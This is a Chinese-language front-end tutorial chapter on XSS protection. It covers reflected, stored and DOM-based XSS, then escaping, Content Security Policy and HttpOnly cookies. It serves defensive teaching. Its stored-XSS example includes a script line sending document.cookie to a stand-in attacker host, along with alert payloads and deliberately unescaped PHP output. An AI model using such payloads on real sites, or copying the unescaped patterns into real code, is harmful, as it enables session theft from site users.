# 第 23 章：XSS 防护

## 概述

XSS（Cross-Site Scripting）跨站脚本攻击是最常见的 Web 安全漏洞之一。了解并防范 XSS 是前端开发的必备技能。

## 一、XSS 攻击类型

### 1.1 反射型 XSS

```html
<!-- 不安全的搜索功能 -->
<p>搜索结果：<?php echo $_GET['q']; ?></p>

<!-- 攻击URL -->
https://example.com/search?q=<script>alert('XSS')</script>
```

### 1.2 存储型 XSS

```html
<!-- 不安全的评论功能 -->
<div class="comment">
  <!-- 直接输出用户输入 -->
  <?php echo $comment; ?>
</div>

<!-- 攻击者提交 -->
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 1.3 DOM 型 XSS

```javascript
// 不安全
const search = location.search.substring(1);
document.getElementById('result').innerHTML = search;

// 访问：example.com?q=<img src=x onerror=alert('XSS')>
```

## 二、防御措施

### 2.1 输入验证

```javascript
// ✅ 验证输入
function sanitizeInput(input) {
  return input.replace(/[<>\"']/g, '');
}

// ✅ 白名单验证
function isValidEmail(email) {
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
}
```

### 2.2 输出转义

```javascript
// HTML 转义
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 使用
element.textContent = userInput;  // ✅ 安全
element.innerHTML = escapeHtml(userInput);  // ✅ 转义后安全
```

### 2.3 Content Security Policy

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted.com">
```

### 2.4 HttpOnly Cookie

```javascript
// 服务器设置
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

## 三、安全编码实践

```javascript
// ❌ 危险
element.innerHTML = userInput;
eval(userInput);
new Function(userInput)();

// ✅ 安全
element.textContent = userInput;
JSON.parse(userInput);
```

## 参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**上一章** ← [第 22 章：SEO 优化](./22-seo-optimization.md)  
**下一章** → [第 24 章：CSRF 防护](./24-csrf-protection.md)
